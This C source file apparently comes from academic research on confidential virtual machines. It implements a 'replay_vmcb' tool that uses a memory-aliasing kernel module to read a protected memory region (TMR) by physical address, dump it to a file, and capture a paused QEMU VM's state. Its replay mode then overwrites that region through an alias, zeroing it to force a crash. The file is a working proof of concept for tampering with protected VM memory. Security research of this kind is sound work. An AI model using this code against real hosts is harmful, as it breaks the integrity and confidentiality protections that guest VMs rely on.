/**
TODO:
*/

#include "kvm_ioctls.h"
#include "stdbool.h"

#include "mem_range_repo.h"
#include "proc_iomem_parser.h"
#include "helpers.h"
#include "readalias.h"
#include "readalias_ioctls.h"
#include <argp.h>
#include <stdio.h>
#include <unistd.h>

#include <openssl/sha.h>


enum main_mode {
	//not a valid mode
	MM_INVALID,
	MM_DUMP,
	MM_REPLAY,
	//not a valid mode
	MM_MAX,
};

//cli arguments
struct arguments {
	enum main_mode mode;
	uint64_t qemu_pid;
	char* alias_file_path;
	//First address of RMP
	// uint64_t rmp_pa_start;
	//Exclusive last address of RMP
	// uint64_t rmp_pa_end;
	//Address of TMR
	uint64_t tmr_pa_start;
	//Length of TMR in bytes
	uint64_t tmr_bytes;
	char* tmr_dump_path;

	bool read_via_alias;
};


/**
 * @brief pase string to enum main_mode
 @ @parameter c : string to parse
 * @returns MM_INVALID on error, else valid enum value
*/
enum main_mode main_mode_from_str(char* c) {
	if( 0 == memcmp(c, "DUMP", strlen("DUMP"))) {
		return MM_DUMP;
	} else if( 0 == memcmp(c, "REPLAY", strlen("REPLAY"))) {
		return MM_REPLAY;
	}
	return MM_INVALID;
}


struct app {
	struct arguments args;
	//memory ranges for which we have alias maks
  mem_range_t* mrs;
	//alias masks for corresponding mrs entry
  uint64_t* alias_masks;
	//length fo mrs (and alias_masks)
  size_t mrs_len;
};

#define SHA256_DIGEST_LENGTH 32

void sha256_hash(const uint8_t *input,size_t input_len, uint8_t *output) {
    SHA256_CTX ctx;
    SHA256_Init(&ctx);
    SHA256_Update(&ctx, input, input_len);
    SHA256_Final(output, &ctx);
}

int dump_tmr(struct app app) {
	FILE* f = NULL;
	uint8_t* tmr_content = NULL;
	page_stats_t stats;
	uint64_t tmr_pa = app.args.tmr_pa_start;
	size_t tmr_bytes = app.args.tmr_bytes;
	//depending to cli flag this is either the true pa or the alias
	uint64_t tmr_access_pa;

	if(app.args.read_via_alias) {
		uint64_t alias_tmr_pa;
		if(get_alias(tmr_pa, app.mrs , app.alias_masks , app.mrs_len, &alias_tmr_pa)) {
			err_log("failed to get alias for tmr_pa 0x%jx\n", tmr_pa);
			goto error;
		}
		printf("tmr_pa\t\t0x%jx\nalias_tmr_pa\t0x%jx\n", tmr_pa, alias_tmr_pa);
		tmr_access_pa = alias_tmr_pa;
	} else {
		tmr_access_pa = tmr_pa;
	}


	tmr_content = (uint8_t*)malloc(app.args.tmr_bytes);
	printf("Copying TMR via  0x%jx bytes 0x%jx aliased? %d\n", tmr_access_pa, tmr_bytes,
		app.args.read_via_alias);
	if(wbinvd_ac()) {
		err_log("wbivnd failed\n");
		goto error;
	}
	if(memcpy_frompa(tmr_content, tmr_access_pa, tmr_bytes , &stats , true)) {
		err_log("failed to read from tmr\n");
		goto error;
	}
	if(wbinvd_ac()) {
		err_log("wbivnd failed\n");
		goto error;
	}
	
	f = fopen(app.args.tmr_dump_path,"wb");
	if(!f) {
		err_log("failed to create file %s : %s\n", app.args.tmr_dump_path, strerror(errno));
		goto error;
	}
	if( 1 != fwrite(tmr_content, tmr_bytes , 1 , f )) {
		err_log("failed to write tmr content to file : %s", strerror(errno));
		goto error;
	}


	int ret = 0;
	goto cleanup;
error:
	ret = -1;
cleanup:
	if(f) fclose(f);
	if(tmr_content) free(tmr_content);
	return ret;
}

int mode_dump(struct app app) {
	if(dump_tmr(app)) {
		err_log("failed to dump tmr content\n");
		return -1;
	}
	return 0;
}

int mode_replay(struct app app) {

	/*
	 * (1) Pause VM, Capture register state, Resume VM
	 * (2) Pause VM, Replay old register state, Resume VM
	*/

	uint8_t* state_A_tmr_content = NULL;
	uint8_t* state_B_tmr_content = NULL;
	uint8_t state_A_tmr_hash[SHA256_DIGEST_LENGTH];
	uint8_t state_B_tmr_hash[SHA256_DIGEST_LENGTH];

	//keeps track if we need to unpause VM in cleanup path
	bool vm_paused = false;
	page_stats_t stats;
	uint64_t tmr_pa = app.args.tmr_pa_start;
	size_t tmr_bytes = app.args.tmr_bytes;
	//depending to cli flag this is either the true pa or the alias
	uint64_t tmr_read_pa;

	//Phase (1)
	printf("Pausing VM...\n");
	if(ioctl_pause_vm_blocking(app.args.qemu_pid)) {
		err_log("ioctl_pause_vm_blocking for qemu pid %ju failed\n", app.args.qemu_pid);
		goto error;
	}
	vm_paused = true;
	printf("VM paused!\nCapturing Register State\n");

	uint64_t alias_tmr_pa;
	if(get_alias(tmr_pa, app.mrs , app.alias_masks , app.mrs_len, &alias_tmr_pa)) {
		err_log("failed to get alias for tmr_pa 0x%jx\n", tmr_pa);
		goto error;
	}
	printf("tmr_pa\t\t0x%jx\nalias_tmr_pa\t0x%jx\n", tmr_pa, alias_tmr_pa);

	if(app.args.read_via_alias) {
		tmr_read_pa = alias_tmr_pa;
	} else {
		tmr_read_pa = tmr_pa;
	}


	state_A_tmr_content = (uint8_t*)malloc(app.args.tmr_bytes);
	printf("Copying TMR via  0x%jx bytes 0x%jx aliased? %d\n", tmr_read_pa, tmr_bytes,
		app.args.read_via_alias);
	if(wbinvd_ac()) {
		err_log("wbivnd failed\n");
		goto error;
	}
	if(memcpy_frompa(state_A_tmr_content, tmr_read_pa, tmr_bytes , &stats , true)) {
		err_log("failed to read from tmr\n");
		goto error;
	}
	if(wbinvd_ac()) {
		err_log("wbivnd failed\n");
		goto error;
	}


	printf("Captured register state!\nResuming VM...\n");
	vm_paused = false;
	if(ioctl_resume_vm_blocking(app.args.qemu_pid)) {
		err_log("failed to unblock VM. GLHF :)\n");
		goto error;
	}
	printf("VM resumed!\nShort sleep...\n");

	//Phase 2

	sleep(1);


	printf("Blocking VM 2nd time...\n");	
	if(ioctl_pause_vm_blocking(app.args.qemu_pid)) {
		err_log("ioctl_pause_vm_blocking for qemu pid %ju failed\n", app.args.qemu_pid);
		goto error;
	}
	vm_paused = true;
	printf("VM blocked!\nReplaying register state...\n");

	state_B_tmr_content = (uint8_t*)malloc(app.args.tmr_bytes);
	printf("Copying TMR via  0x%jx bytes 0x%jx aliased? %d\n", tmr_read_pa, tmr_bytes,
		app.args.read_via_alias);
	if(wbinvd_ac()) {
		err_log("wbivnd failed\n");
		goto error;
	}
	if(memcpy_frompa(state_B_tmr_content, tmr_read_pa, tmr_bytes , &stats , true)) {
		err_log("failed to read from tmr\n");
		goto error;
	}
	if(wbinvd_ac()) {
		err_log("wbivnd failed\n");
		goto error;
	}

	//Print hash values to check that we actualy replayed updated data
	sha256_hash(state_A_tmr_content, app.args.tmr_bytes, state_A_tmr_hash);
	sha256_hash(state_B_tmr_content, app.args.tmr_bytes, state_B_tmr_hash);
	printf("Hash for state A: ");
	hexdump(state_A_tmr_hash, sizeof(state_A_tmr_hash));
	printf("Hash for state B: ");
	hexdump(state_B_tmr_hash, sizeof(state_B_tmr_hash));

	printf("Memsetting state to garbage to force crash\n");
	memset(state_A_tmr_content , 0x0, app.args.tmr_bytes);
	

	if(memcpy_topa(alias_tmr_pa, state_A_tmr_content, tmr_bytes , &stats , true)) {
		err_log("failed to read from tmr\n");
		goto error;
	}
	if(wbinvd_ac()) {
		err_log("wbivnd failed\n");
		goto error;
	}

	printf("Replayed register state!\nResuming VM...\n");
	vm_paused = false;
	if(ioctl_resume_vm_blocking(app.args.qemu_pid)) {
		err_log("failed to unblock VM. GLHF :)\n");
	}
	printf("VM resumed\n");

	int ret = 0;
	goto cleanup;
error:
	ret = -1;
cleanup:
	if(state_A_tmr_content) free(state_A_tmr_content);
	if(state_B_tmr_content) free(state_B_tmr_content);
	if(vm_paused) {
		if(ioctl_resume_vm_blocking(app.args.qemu_pid)) {
			err_log("failed to unblock VM in clenaup path. GLHF :)\n");
			ret = -1;
		}
	}
	return ret;
}

/**
 * @brief main function
 * @returns 0 on success
*/
int run(struct arguments args) {
  mem_range_t* mrs = NULL;
  uint64_t* alias_masks = NULL;
  size_t mrs_len;

	if(open_kmod() ) {
		err_log("failed to open readalias kernel module\n");
		goto error;
	}

  if( parse_csv(args.alias_file_path, &mrs, &alias_masks, &mrs_len) ) {
      err_log("failed to parse memory range and aliases from %s\n", args.alias_file_path);
      return -1;
  }

	struct app app = {
		.args = args,
		.mrs = mrs,
		.alias_masks = alias_masks,
		.mrs_len = mrs_len,
	};

	switch (app.args.mode) {

    case MM_DUMP:
			if(mode_dump(app)) {
				err_log("mode dump failed\n");
				goto error;
			}
			break;
    case MM_REPLAY:
			if(mode_replay(app)) {
				err_log("mode replay failed\n");
				goto error;
			}
			break;
		default:
			err_log("invalid operation mode %d\n", app.args.mode);
			goto error;
  }

  int ret = 0;
	goto cleanup;
error:
	ret = -1;
cleanup:
	close_kmod();
	if(mrs) free(mrs);
	if(alias_masks) free(alias_masks);
	return ret;
}

const char* argp_program_version = "replay_vmcb";
const char* argp_program_bug_address = "l.wilke@uni-luebeck.de";
static char doc[] = "Replay VMCB content";
static char args_doc[] = " --mode <{DUMP,REPLAY}>--aliases <FILE PATH> --tmr-pa <HEX ADDR> --tmr-bytes <HEX> [--read-via-alias] [--qemu-pid]";
static struct argp_option options[] = {
	{"aliases", 1, "FILE", 0, "CSV file (same syntax as fai tool output) that specifies the memory ranges and alias functions\n", 0},
	{"tmr-pa", 2, "HEX ADDR", 0, "0x prefixed address for TMR (see dmesg log)", 0},
	{"tmr-bytes", 3, "HEX VALUE",0, "0x prefixed length of TMR in bytes", 0},
	{"tmr-dump", 4, "FILE", 0, "Dump TMR content to this file", 0},
	{"read-via-alias", 5, 0, 0, "Read TMR via alias instead of direct access", 0},
	{"mode", 6, "OPERATION MODE", 0, "Main operation mode/subcommand", 0},
	{"qemu-pid", 7, "PID", 0, "PID of QEMU process running the VM. Required for REPLAY mode", 0},
	{0},
};


static error_t parse_opt(int key, char* arg, struct argp_state* state) {
	struct arguments* args = (struct arguments*)state->input;
	switch(key) {
		case 1:
			args->alias_file_path = arg;
			break;
		case 2:
			if(do_stroul(arg, 0 ,&(args->tmr_pa_start) )) {
				err_log("failed to parse tmr_pa \"%s\" to number\n", arg);
				return ARGP_ERR_UNKNOWN;
			}
			break;
		case 3:
			if(do_stroul(arg, 0 ,&(args->tmr_bytes) )) {
				err_log("failed to parse tmr_bytes \"%s\" to number\n", arg);
				return ARGP_ERR_UNKNOWN;
			}
			break;
		case 4:
			args->tmr_dump_path = arg;
			break;
		case 5:
			args->read_via_alias = true;
			break;
		case 6: {
				enum main_mode m = main_mode_from_str(arg);
				if(m == MM_INVALID ) {
					err_log("invalid mode value \"%s\"", arg);
					return ARGP_ERR_UNKNOWN;
				}
				args->mode =m;
			}
			break;
		case 7:
			if(do_stroul(arg, 0, &(args->qemu_pid))) {
				err_log("failed to parse qemu-pid value \"%s\" to number\n", arg);
				return ARGP_ERR_UNKNOWN;
			}
			break;
		case ARGP_KEY_END:
			//check args that need to be present in all modes
			if( (args->alias_file_path == NULL) ||
				(args->tmr_pa_start == 0) ||
				(args->tmr_bytes ==0) ||
				(args->mode == MM_INVALID)) {
				printf("Missing required options\n");
				argp_usage(state);
				return ARGP_ERR_UNKNOWN;
			}
			//check args for dump mode
			if( args->mode == MM_DUMP ) {
				if( args->tmr_dump_path == NULL) {
					printf("Missing dump mode specific required options\n");
					argp_usage(state);
					return ARGP_ERR_UNKNOWN;
			
				}
			} else if( args->mode == MM_REPLAY) { //check args for replay mode
				if( args->qemu_pid == 0 ) {
					printf("Missing replay mode specific required options\n");
					argp_usage(state);
					return ARGP_ERR_UNKNOWN;
				}
			}
			break;
		default:
			return ARGP_ERR_UNKNOWN;
	}
	return 0;
}

static struct argp argp = {
	options,
	parse_opt,
	args_doc,
	doc,
	0,
	0,
	0,
};

int main(int argc, char** argv) {
	struct arguments args = {0};
	args.mode = MM_INVALID;
	if(argp_parse(&argp, argc, argv, 0, 0, &args)) {
		printf("Failed to parse arguments\n");
		return -1;
	}
	return run(args);
}
